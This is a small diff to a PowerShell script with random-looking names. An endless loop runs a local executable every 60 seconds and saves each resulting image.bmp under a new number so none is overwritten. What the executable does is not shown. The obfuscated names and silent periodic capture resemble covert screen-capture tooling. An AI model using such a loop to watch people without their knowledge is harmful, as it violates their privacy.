@@ -1,8 +1,10 @@
 $xNaqfyEYmt = 0
 
 while ($true) {
-    UaAIVKpYhR.exe
+    ./UaAIVKpYhR.exe
+    while (Test-Path "${xNaqfyEYmt}etslzobCVS.bmp") {
+        $xNaqfyEYmt++
+    }
     Move-Item -Path image.bmp -Destination "${xNaqfyEYmt}etslzobCVS.bmp"
-    $xNaqfyEYmt++
     Start-Sleep -Seconds 60
 }
